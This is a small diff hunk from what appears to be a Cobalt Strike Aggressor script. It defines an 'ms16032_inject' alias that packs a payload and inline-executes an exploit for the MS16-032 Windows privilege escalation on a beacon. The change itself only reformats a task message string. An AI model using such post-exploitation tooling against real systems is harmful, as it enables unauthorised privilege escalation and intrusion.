@@ -38,7 +38,7 @@ alias ms16032_inject {
 
     $args = bof_pack($1, "b", $payload);
 
-    btask($1, "MS16-032 LPE -> $listener ($barch)");
+    btask($1, "MS16-032 LPE -> $listener \(" . $barch . "\)");
     beacon_inline_execute($1, $data, "go", $args);
 }
 
